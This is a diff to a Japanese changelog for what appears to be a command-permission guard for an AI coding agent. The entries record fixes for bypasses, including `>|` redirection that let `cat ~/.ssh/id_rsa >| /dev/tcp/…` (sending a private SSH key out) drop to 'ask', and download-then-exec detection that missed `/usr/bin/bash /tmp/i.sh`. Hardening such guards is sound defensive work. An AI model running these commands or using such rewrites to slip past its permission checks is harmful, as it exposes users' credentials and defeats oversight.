@@ -45,6 +45,8 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   別コマンドとして扱っていたため、`echo {} >| ~/.claude/settings.json` が allow、
   `cat ~/.ssh/id_rsa >| /dev/tcp/…` が ask に格下げされていた問題を修正
   (#258 / #262 のうち `>|` の部分)。
+- download-then-exec が `/usr/bin/bash /tmp/i.sh` のように interpreter を絶対パスで
+  呼ぶと head を実行ファイルとみなし、第 1 引数のスクリプトを見ていなかった問題を修正。
 - 上記はいずれも bash の等価変形による有界網羅テスト
   (`tests/bash_quote_equivalence.rs`) で検出。
 
